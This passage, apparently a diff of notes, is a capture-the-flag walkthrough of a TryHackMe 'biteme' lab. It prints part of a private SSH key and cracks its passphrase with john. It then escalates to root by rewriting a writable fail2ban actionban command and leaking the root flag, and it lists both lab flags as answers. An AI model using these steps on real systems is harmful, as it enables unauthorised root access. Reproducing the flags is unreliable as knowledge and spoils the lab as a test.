@@ -295,3 +295,300 @@ DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9
 
 nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
 vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
+JaLEJzzdiehg0R3LDqZqeuVvy9Cc1WItPuKRLHJtoiKHsFvm9arbW4F/Jxa7aVgH
+l5rfo6pEI0liruklDfFrDjz96OaRtdkOpM3Q3GxYV2Xm4h/Eg0CamC7xJC8RHr/w
+EONcJm5rHB6nDVV5zew+dCpYa83dMViq7LOGEZ9QdsVqHS59RYEffMc45jkKv3Kn
+ky+y75CgYCWjtLbhUc4Ml21kYz/pDdObncIRH3m6aF3w/b0F/RlyAYQYUYGfR3/5
+Y9a2/hVbBLX7oM+KQqWHD5c05mLNfAYWTUxtbANVy797CSzYssMcCrld7OnDtFx7
+qPonOIRjgtfCodJuCou0o3jRpzwCwTyfOvnd29SF70rN8klzjpxvqNEEbSfnh04m
+ss1fTMX1eypmCsHecmpjloTxdPdj1aDorwLkJZtn7h+o3mkWG0H8vnCZArtxeiiX
+t/89evJXhVKHSgf83xPvCUvnd2KSjTakBNmsSKoBL2b3AN3S/wwapEzdcuKG5y3u
+wBvVfNpAD3PmqTpvFLClidnR1mWE4r4G1dHwxjYurEnu9XKO4d+Z1VAPLI2gTmtd
+NblKTwZQCWp20rRErOyT9MxjT1gTkVmpiJ0ObzQHOGKJIVaMS8oEng2gYs48nugS
+AsafORd3khez4r/5g9opRj8rdCkK83fG5WA15kzcOJ+BqiKyGU26hCbNuOAHaAbq
+Zp+Jqf4K6FcKsrL2VVCmPKOvkTEItVIFGDywp3u+v0LGjML0wbrGtGzP7pPqYTZ5
+gJ4TBOa5FUfhQPAJXXJU3pz5svAHgTsTMRw7p8CSfedCW/85bMWgzt5XuQdiHZA0
+FeZErRU54+ntlJ1YdLEjVWbhVhzHyBXnEXofj7XHaNvG7+r2bH8GYL6PeSK1Iiz7
+/SiK/v4kjOP8Ay/35YFyfCYCykhdJO648MXb+bjblrAJldeXO2jAyu4LlFlJlv6/
+bKB7viLrzVDSzXIrFHNoVdFmLqT3yEmui4JgFPgtWoHUOQNUw8mDdfCR0x3GAXZP
+XIU1Yn67iZ9TMz6z8HDuc04GhiE0hzI6JBKJP8vGg7X8rBuA7DgoFujSOg7e8HYX
+7t07CkDJcAfqy/IULQ8pWtEFTSXz1bFpl360v42dELc6BwhYu4Z4qza9FtYS0L/d
+ts5aw3VS07Xp5v/pX+RogV8uIa0jOKTkVy5ZnnlJk1qa9zWX3o8cz0P4TualAn+h
+dQBVNOgRIZ11a6NU0bhLCJTL2ZheUwe9MTqvgRn1FVsv4yFGo/hIXb6BtXQE74fD
+xF6icxCBWQSbU8zgkl2QHheONYdfNN0aesoFGWwvRw0/HMr4/g3g7djFc+6rrbQY
+xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
+VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
+-----END RSA PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 600 bite_idrsa  
+                                                                                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh2john bite_idrsa > bite_hash.txt
+                                                                                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt bite_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1a2b3c4d         (bite_idrsa)     
+1g 0:00:00:00 DONE () 16.66g/s 83733p/s 83733c/s 83733C/s christina1..dumnezeu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i bite_idrsa jason@10.10.201.234
+The authenticity of host '10.10.201.234 (10.10.201.234)' can't be established.
+ED25519 key fingerprint is SHA256:3NvL4FLmtivo46j76+yqa43LcYEB79JAUuXUAYQe/zI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.201.234' (ED25519) to the list of known hosts.
+Enter passphrase for key 'bite_idrsa': 
+Last login: Fri Mar  4 18:22:12 2022 from 10.0.2.2
+jason@biteme:~$ id
+uid=1000(jason) gid=1000(jason) groups=1000(jason),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
+
+jason@biteme:~$ sudo -l
+Matching Defaults entries for jason on biteme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jason may run the following commands on biteme:
+    (ALL : ALL) ALL
+    (fred) NOPASSWD: ALL
+
+jason@biteme:~$ sudo -u fred bash
+fred@biteme:~$ sudo -l
+Matching Defaults entries for fred on biteme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User fred may run the following commands on biteme:
+    (root) NOPASSWD: /bin/systemctl restart fail2ban
+
+https://www.fail2ban.org/wiki/index.php/Main_Page
+
+fred@biteme:~$ cat /etc/fail2ban/jail.local 
+[sshd]
+enabled   = true
+maxretry  = 3
+findtime  = 2m
+bantime   = 2m
+banaction = iptables-multiport
+
+https://grumpygeekwrites.wordpress.com//privilege-escalation-via-fail2ban/
+
+fred@biteme:~$ ls -lah /etc/fail2ban/action.d
+total 288K
+drwxrwxrwx 2 root root 4.0K Nov 13  2021 .
+drwxr-xr-x 6 root root 4.0K Nov 13  2021 ..
+-rw-r--r-- 1 root root 3.8K Jan 18  2018 abuseipdb.conf
+-rw-r--r-- 1 root root  587 Jan 18  2018 apf.conf
+-rw-r--r-- 1 root root  629 Jan 18  2018 badips.conf
+-rw-r--r-- 1 root root  11K Jan 18  2018 badips.py
+-rw-r--r-- 1 root root 2.6K Jan 18  2018 blocklist_de.conf
+-rw-r--r-- 1 root root 3.1K Jan 18  2018 bsd-ipfw.conf
+-rw-r--r-- 1 root root 2.7K Jan 18  2018 cloudflare.conf
+-rw-r--r-- 1 root root 4.6K Jan 18  2018 complain.conf
+-rw-r--r-- 1 root root 7.5K Jan 18  2018 dshield.conf
+-rw-r--r-- 1 root root 1.6K Jan 18  2018 dummy.conf
+-rw-r--r-- 1 root root 1.5K Jan 18  2018 firewallcmd-allports.conf
+-rw-r--r-- 1 root root 2.6K Jan 18  2018 firewallcmd-common.conf
+-rw-r--r-- 1 root root 2.2K Jan 18  2018 firewallcmd-ipset.conf
+-rw-r--r-- 1 root root 1.3K Jan 18  2018 firewallcmd-multiport.conf
+-rw-r--r-- 1 root root 1.9K Jan 18  2018 firewallcmd-new.conf
+-rw-r--r-- 1 root root 2.3K Jan 18  2018 firewallcmd-rich-logging.conf
+-rw-r--r-- 1 root root 1.8K Jan 18  2018 firewallcmd-rich-rules.conf
+-rw-r--r-- 1 root root  589 Jan 18  2018 helpers-common.conf
+-rw-r--r-- 1 root root 1.4K Jan 18  2018 hostsdeny.conf
+-rw-r--r-- 1 root root 1.5K Jan 18  2018 ipfilter.conf
+-rw-r--r-- 1 root root 1.4K Jan 18  2018 ipfw.conf
+-rw-r--r-- 1 root root 1.4K Jan 18  2018 iptables-allports.conf
+-rw-r--r-- 1 root root 2.7K Jan 18  2018 iptables-common.conf
+-rw-r--r-- 1 root root 1.4K Jan 18  2018 iptables.conf
+-rw-r--r-- 1 root root 2.0K Jan 18  2018 iptables-ipset-proto4.conf
+-rw-r--r-- 1 root root 2.2K Jan 18  2018 iptables-ipset-proto6-allports.conf
+-rw-r--r-- 1 root root 2.2K Jan 18  2018 iptables-ipset-proto6.conf
+-rw-r--r-- 1 fred root 1.4K Nov 13  2021 iptables-multiport.conf
+-rw-r--r-- 1 root root 2.1K Jan 18  2018 iptables-multiport-log.conf
+-rw-r--r-- 1 root root 1.5K Jan 18  2018 iptables-new.conf
+-rw-r--r-- 1 root root 2.6K Jan 18  2018 iptables-xt_recent-echo.conf
+-rw-r--r-- 1 root root 2.3K Jan 18  2018 mail-buffered.conf
+-rw-r--r-- 1 root root 1.6K Jan 18  2018 mail.conf
+-rw-r--r-- 1 root root 1.1K Jan 18  2018 mail-whois-common.conf
+-rw-r--r-- 1 root root 1.8K Jan 18  2018 mail-whois.conf
+-rw-r--r-- 1 root root 2.3K Jan 18  2018 mail-whois-lines.conf
+-rw-r--r-- 1 root root 5.2K Jan 18  2018 mynetwatchman.conf
+-rw-r--r-- 1 root root 1.5K Jan 18  2018 netscaler.conf
+-rw-r--r-- 1 root root  490 Jan 18  2018 nftables-allports.conf
+-rw-r--r-- 1 root root 4.0K Jan 18  2018 nftables-common.conf
+-rw-r--r-- 1 root root  496 Jan 18  2018 nftables-multiport.conf
+-rw-r--r-- 1 root root 3.7K Jan 18  2018 nginx-block-map.conf
+-rw-r--r-- 1 root root 1.5K Jan 18  2018 npf.conf
+-rw-r--r-- 1 root root 3.1K Jan 18  2018 nsupdate.conf
+-rw-r--r-- 1 root root  469 Jan 18  2018 osx-afctl.conf
+-rw-r--r-- 1 root root 2.2K Jan 18  2018 osx-ipfw.conf
+-rw-r--r-- 1 root root 3.6K Jan 18  2018 pf.conf
+-rw-r--r-- 1 root root 1023 Jan 18  2018 route.conf
+-rw-r--r-- 1 root root 2.8K Jan 18  2018 sendmail-buffered.conf
+-rw-r--r-- 1 root root 1.8K Jan 18  2018 sendmail-common.conf
+-rw-r--r-- 1 root root  857 Jan 18  2018 sendmail.conf
+-rw-r--r-- 1 root root 1.8K Jan 18  2018 sendmail-geoip-lines.conf
+-rw-r--r-- 1 root root  977 Jan 18  2018 sendmail-whois.conf
+-rw-r--r-- 1 root root 1.1K Jan 18  2018 sendmail-whois-ipjailmatches.conf
+-rw-r--r-- 1 root root 1.1K Jan 18  2018 sendmail-whois-ipmatches.conf
+-rw-r--r-- 1 root root 1.3K Jan 18  2018 sendmail-whois-lines.conf
+-rw-r--r-- 1 root root  997 Jan 18  2018 sendmail-whois-matches.conf
+-rw-r--r-- 1 root root 2.1K Jan 18  2018 shorewall.conf
+-rw-r--r-- 1 root root 3.0K Jan 18  2018 shorewall-ipset-proto6.conf
+-rw-r--r-- 1 root root 6.0K Jan 18  2018 smtp.py
+-rw-r--r-- 1 root root 1.3K Jan 18  2018 symbiosis-blacklist-allports.conf
+-rw-r--r-- 1 root root 1.1K Jan 18  2018 ufw.conf
+-rw-r--r-- 1 root root 6.0K Jan 18  2018 xarf-login-attack.conf
+
+fred@biteme:~$ ls -lah /etc/fail2ban/action.d/iptables-multiport.conf
+-rw-r--r-- 1 fred root 1.4K Nov 13  2021 /etc/fail2ban/action.d/iptables-multiport.conf
+
+fred@biteme:~$ nano /etc/fail2ban/action.d/iptables-multiport.conf
+Unable to create directory /home/jason/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+fred@biteme:~$ cat /etc/fail2ban/action.d/iptables-multiport.conf
+```
+```text
+# Fail2Ban configuration file
+#
+```
+```text
+# Author: Cyril Jaquier
+```
+```text
+# Modified by Yaroslav Halchenko for multiport banning
+#
+
+[INCLUDES]
+
+before = iptables-common.conf
+
+[Definition]
+```
+```text
+# Option:  actionstart
+```
+```text
+# Notes.:  command executed once at the start of Fail2Ban.
+```
+```text
+# Values:  CMD
+#
+actionstart = <iptables> -N f2b-<name>
+              <iptables> -A f2b-<name> -j <returntype>
+              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
+```
+```text
+# Option:  actionstop
+```
+```text
+# Notes.:  command executed once at the end of Fail2Ban
+```
+```text
+# Values:  CMD
+#
+actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
+             <actionflush>
+             <iptables> -X f2b-<name>
+```
+```text
+# Option:  actioncheck
+```
+```text
+# Notes.:  command executed once before each actionban command
+```
+```text
+# Values:  CMD
+#
+actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
+```
+```text
+# Option:  actionban
+```
+```text
+# Notes.:  command executed when banning an IP. Take care that the
+```
+```text
+#          command is executed with Fail2Ban user rights.
+```
+```text
+# Tags:    See jail.conf(5) man page
+```
+
+## Exploitation
+```text
+# Values:  CMD
+#
+actionban = cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt
+
+fred@biteme:~$ sudo systemctl restart fail2ban
+
+fred@biteme:~$ exit
+exit
+jason@biteme:~$ exit
+logout
+Connection to 10.10.201.234 closed.
+
+3 times error 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh jason@10.10.201.234     
+jason@10.10.201.234's password: 
+Permission denied, please try again.
+jason@10.10.201.234's password: 
+Permission denied, please try again.
+jason@10.10.201.234's password: 
+jason@10.10.201.234: Permission denied (publickey,password).
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh jason@10.10.201.234                                                
+jason@10.10.201.234's password: 
+Permission denied, please try again.
+jason@10.10.201.234's password: 
+Permission denied, please try again.
+jason@10.10.201.234's password: 
+jason@10.10.201.234: Permission denied (publickey,password).
+                                                                                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh jason@10.10.201.234
+jason@10.10.201.234's password: 
+Permission denied, please try again.
+jason@10.10.201.234's password: 
+Permission denied, please try again.
+jason@10.10.201.234's password: 
+jason@10.10.201.234: Permission denied (publickey,password).
+                                                                                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i bite_idrsa jason@10.10.201.234
+Enter passphrase for key 'bite_idrsa': 
+Last login: Fri Jun 23 17:07:00 2023 from 10.8.19.103
+jason@biteme:~$ cd /tmp
+jason@biteme:/tmp$ ls
+root.txt
+systemd-private-3e4e476e6d18475fbd0b7b5792be96dc-apache2.service-B8MM2X
+systemd-private-3e4e476e6d18475fbd0b7b5792be96dc-systemd-resolved.service-aEzNPq
+systemd-private-3e4e476e6d18475fbd0b7b5792be96dc-systemd-timesyncd.service-HLvIml
+jason@biteme:/tmp$ cat root.txt 
+THM{0e355b5c907ef7741f40f4a41cc6678d}
+```
+![[Pasted image 20230623114704.png]]
+What is the user flag?
+What is the root flag?
+
+## Flags / Answers
+- ***THM{6fbf1fb7241dac060cd3abba70c33070}***
+- ***THM{0e355b5c907ef7741f40f4a41cc6678d}***
+
+## Notes / Lessons Learned
+[[HaskHell]]
+
